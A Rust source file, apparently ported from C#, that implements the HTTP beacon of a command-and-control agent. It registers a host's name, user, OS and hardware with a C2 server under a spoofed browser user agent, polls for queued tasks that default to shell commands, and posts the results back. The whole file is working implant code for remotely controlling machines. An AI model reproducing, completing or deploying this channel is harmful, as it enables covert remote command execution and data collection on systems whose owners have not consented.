//! HTTP communicator — registration, heartbeat polling, result submission.
//! Port of HttpCommunicator.cs.

use libra_common::models::AgentTask;
use reqwest::Client;

/// HTTP communicator for beacon-style communication with the C2 server.
pub struct HttpCommunicator {
    client: Client,
    server_url: String,
    register_path: String,
    heartbeat_path: String,
    result_path: String,
}

impl HttpCommunicator {
    pub fn new(
        server_url: &str,
        register_path: &str,
        heartbeat_path: &str,
        result_path: &str,
    ) -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client,
            server_url: server_url.to_string(),
            register_path: register_path.to_string(),
            heartbeat_path: heartbeat_path.to_string(),
            result_path: result_path.to_string(),
        }
    }

    fn register_url(&self) -> String {
        format!("{}{}", self.server_url, self.register_path)
    }

    fn heartbeat_url(&self) -> String {
        format!("{}{}", self.server_url, self.heartbeat_path)
    }

    fn result_url(&self) -> String {
        format!("{}{}", self.server_url, self.result_path)
    }

    /// Register with the C2 server. Returns the assigned agent_id on success.
    pub async fn register(
        &self,
        hostname: &str,
        user_name: &str,
        os_version: &str,
        arch: &str,
        public_key: &str,
        hardware_json: &str,
    ) -> Result<String, String> {
        let pid = std::process::id();
        let hw = if hardware_json.is_empty() || hardware_json == "null" {
            "null"
        } else {
            hardware_json
        };

        let json = format!(
            r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","hardware":{}}}"#,
            escape(hostname),
            escape(user_name),
            escape(os_version),
            escape(arch),
            pid,
            escape(public_key),
            hw
        );

        let resp = self
            .client
            .post(self.register_url())
            .header("Content-Type", "application/json")
            .body(json)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Registration failed with status: {}", resp.status()));
        }

        let body = resp.text().await.map_err(|e| e.to_string())?;
        extract_string(&body, "agent_id").ok_or_else(|| "agent_id not found in response".into())
    }

    /// Send a heartbeat and receive a pending task (if any).
    pub async fn heartbeat(&self, agent_id: &str) -> Result<Option<AgentTask>, String> {
        let resp = self
            .client
            .post(self.heartbeat_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body("{}")
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Heartbeat failed: {}", resp.status()));
        }

        let body = resp.text().await.map_err(|e| e.to_string())?;

        match extract_object(&body, "pendingTask") {
            Some(task_json) if !task_json.is_empty() && task_json != "null" => {
                Ok(Some(parse_task(&task_json)))
            }
            _ => Ok(None),
        }
    }

    /// Submit task result back to the C2 server.
    pub async fn submit_result(
        &self,
        agent_id: &str,
        result_json: &str,
    ) -> Result<(), String> {
        self.client
            .post(self.result_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body(result_json.to_string())
            .send()
            .await
            .map_err(|e| e.to_string())?;
        Ok(())
    }
}

// ── JSON extraction helpers (avoid full deserialization for C# compat) ─

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

fn extract_string(json: &str, key: &str) -> Option<String> {
    let search = format!("\"{}\":\"", key);
    let start = json.find(&search)?;
    let start = start + search.len();
    let end = json[start..].find('"')?;
    Some(json[start..start + end].to_string())
}

fn extract_object(json: &str, key: &str) -> Option<String> {
    let search = format!("\"{}\":", key);
    let start = json.find(&search)?;
    let mut pos = start + search.len();

    let bytes = json.as_bytes();
    // Skip whitespace
    while pos < bytes.len() && (bytes[pos] == b' ' || bytes[pos] == b'\n' || bytes[pos] == b'\r') {
        pos += 1;
    }

    if pos >= bytes.len() {
        return None;
    }

    if bytes[pos] == b'n' {
        return None; // null
    }
    if bytes[pos] != b'{' {
        return None;
    }

    let mut depth = 0;
    let obj_start = pos;
    while pos < bytes.len() {
        match bytes[pos] {
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(json[obj_start..=pos].to_string());
                }
            }
            _ => {}
        }
        pos += 1;
    }
    None
}

fn parse_task(json: &str) -> AgentTask {
    use libra_common::models::{CommandType, TaskStatus};

    let id = extract_string(json, "id").unwrap_or_default();
    let agent_id = extract_string(json, "agentId").unwrap_or_default();
    let created_by = extract_string(json, "createdBy").unwrap_or_default();
    let command = extract_string(json, "command").unwrap_or_default();
    let status = extract_string(json, "status")
        .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
        .unwrap_or(TaskStatus::Pending);
    let command_type = extract_string(json, "commandType")
        .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
        .unwrap_or(CommandType::Shell);
    let output = extract_string(json, "output");
    let error = extract_string(json, "error");
    let timeout_seconds = extract_string(json, "timeoutSeconds")
        .and_then(|s| s.parse().ok())
        .unwrap_or(60);

    AgentTask {
        id,
        agent_id,
        created_by,
        command,
        command_type,
        arguments: Vec::new(),
        status,
        output,
        error,
        timeout_seconds,
    }
}
